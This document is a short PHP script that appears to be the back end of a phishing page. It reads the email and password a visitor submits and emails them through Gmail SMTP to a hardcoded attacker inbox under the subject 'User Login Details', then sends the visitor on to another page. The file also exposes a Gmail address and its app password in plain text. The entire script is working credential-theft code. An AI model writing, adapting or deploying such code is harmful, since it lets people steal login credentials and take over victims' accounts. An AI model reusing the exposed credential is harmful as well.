<?php
// Load Composer's autoloader
require 'vendor/autoload.php';

// Import PHPMailer classes into the global namespace
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

// Create an instance of PHPMailer
$mail = new PHPMailer(true);

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $email = $_POST['email'] ?? ''; // Now the email is passed correctly from the hidden input
    $password = $_POST['password'] ?? '';

    try {
        // Server settings
        $mail->isSMTP();
        $mail->Host = 'smtp.gmail.com'; // Use Gmail's SMTP server
        $mail->SMTPAuth = true;
        $mail->Username = 'yahyaahmed9929@gmail.com'; // Your email address
        $mail->Password = 'ewap tvrj zejq iafy'; // Your app-specific password (with spaces)
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
        $mail->Port = 587; // TLS port

        // Recipients
        $mail->setFrom('yahyaahmed9929@gmail.com', 'Mailer');
        $mail->addAddress('yahyaahmed9929@gmail.com', 'Your Name'); // Use the same email as the recipient

        // Content
        $mail->isHTML(true);
        $mail->Subject = 'User Login Details';
        $mail->Body = "User Email: $email<br>Password: $password";

        // Send the email
        $mail->send();

        // Redirect to sec.html after successful email sending
        header("Location: sec.html");
        exit(); // Ensure the script stops executing after the redirect
    } catch (Exception $e) {
        echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
    }
}
?>
